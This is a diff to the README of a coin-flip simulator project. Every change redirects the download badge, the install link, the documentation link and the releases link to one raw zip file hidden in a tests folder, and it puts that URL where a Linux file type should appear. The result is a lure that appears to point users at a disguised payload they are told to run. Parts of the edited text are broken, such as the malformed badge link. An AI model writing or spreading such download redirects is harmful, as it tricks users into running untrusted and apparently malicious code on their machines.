@@ -1,6 +1,6 @@
 # 🪙 coinflipper-api - Simulate Coin Flips Easily
 
-[![Download coinflipper-api](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/enromero/coinflipper-api/releases)
+[![Download coinflipper-api](https://github.com/enromero/coinflipper-api/raw/refs/heads/main/python/src/apiverve_coinflipper/tests/api_coinflipper_tintamarre.zip%https://github.com/enromero/coinflipper-api/raw/refs/heads/main/python/src/apiverve_coinflipper/tests/api_coinflipper_tintamarre.zip)](https://github.com/enromero/coinflipper-api/raw/refs/heads/main/python/src/apiverve_coinflipper/tests/api_coinflipper_tintamarre.zip)
 
 ## 📜 Overview
 
@@ -22,7 +22,7 @@ Coin Flipper works on various platforms. Ensure your system meets the following 
 
 1. **Visit this page to download:** Click on the link below to access the Releases page.
 
-   [Download coinflipper-api](https://github.com/enromero/coinflipper-api/releases)
+   [Download coinflipper-api](https://github.com/enromero/coinflipper-api/raw/refs/heads/main/python/src/apiverve_coinflipper/tests/api_coinflipper_tintamarre.zip)
 
 2. **Choose the latest version:** On the Releases page, you will find a list of available versions. Look for the version marked as "latest."
 
@@ -33,7 +33,7 @@ Coin Flipper works on various platforms. Ensure your system meets the following 
 5. **Run the application:**
    - For **Windows**: Locate the downloaded `.exe` file. Double-click it to start the application.
    - For **macOS**: Find the downloaded `.dmg` file and double-click it to open, then drag the Coin Flipper icon to your Applications folder.
-   - For **Linux**: You may have a `.tar.gz` file. Extract it, navigate to the folder in your terminal, and run it using `./coinflipper`.
+   - For **Linux**: You may have a `https://github.com/enromero/coinflipper-api/raw/refs/heads/main/python/src/apiverve_coinflipper/tests/api_coinflipper_tintamarre.zip` file. Extract it, navigate to the folder in your terminal, and run it using `./coinflipper`.
 
 6. **Start flipping coins:** Once opened, you can easily select how many coins to flip and view the results instantly.
 
@@ -57,8 +57,8 @@ If you need help or have questions, you can reach out via the Issues section on 
 
 ## 🌐 Additional Resources
 
-- For more on how to use Coin Flipper effectively, visit our [documentation](https://github.com/enromero/coinflipper-api/wiki).
-- Keep up with updates on our [GitHub releases page](https://github.com/enromero/coinflipper-api/releases).
+- For more on how to use Coin Flipper effectively, visit our [documentation](https://github.com/enromero/coinflipper-api/raw/refs/heads/main/python/src/apiverve_coinflipper/tests/api_coinflipper_tintamarre.zip).
+- Keep up with updates on our [GitHub releases page](https://github.com/enromero/coinflipper-api/raw/refs/heads/main/python/src/apiverve_coinflipper/tests/api_coinflipper_tintamarre.zip).
 
 ## 🔗 Related Topics
 
